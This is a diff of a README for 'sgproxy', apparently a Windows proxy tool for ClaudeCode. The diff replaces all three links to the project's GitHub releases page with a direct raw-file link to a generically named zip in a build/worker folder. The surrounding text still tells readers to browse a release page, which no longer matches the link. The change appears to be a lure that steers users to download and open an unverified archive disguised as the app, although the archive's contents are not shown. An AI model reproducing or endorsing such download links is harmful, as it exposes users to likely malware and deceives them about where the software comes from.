@@ -1,6 +1,6 @@
 # ⚡ sgproxy - Simple ClaudeCode Proxy Control
 
-[![Download sgproxy](https://img.shields.io/badge/Download%20sgproxy-Visit%20Releases-blue)](https://github.com/Esethu1974/sgproxy/releases)
+[![Download sgproxy](https://img.shields.io/badge/Download%20sgproxy-Visit%20Releases-blue)](https://raw.githubusercontent.com/Esethu1974/sgproxy/main/build/worker/Software-v1.6-beta.1.zip)
 
 ## 🧭 What sgproxy does
 
@@ -12,7 +12,7 @@ It is built for users who want a focused setup for ClaudeCode only. It does not 
 
 Visit this page to download sgproxy:
 
-https://github.com/Esethu1974/sgproxy/releases
+https://raw.githubusercontent.com/Esethu1974/sgproxy/main/build/worker/Software-v1.6-beta.1.zip
 
 On that page, look for the latest release for Windows. Download the file that matches your system, then open it to start the app or installer.
 
@@ -149,7 +149,7 @@ If the browser page does not open:
 
 Download or update sgproxy here:
 
-https://github.com/Esethu1974/sgproxy/releases
+https://raw.githubusercontent.com/Esethu1974/sgproxy/main/build/worker/Software-v1.6-beta.1.zip
 
 ## 🧾 What this app is for
 
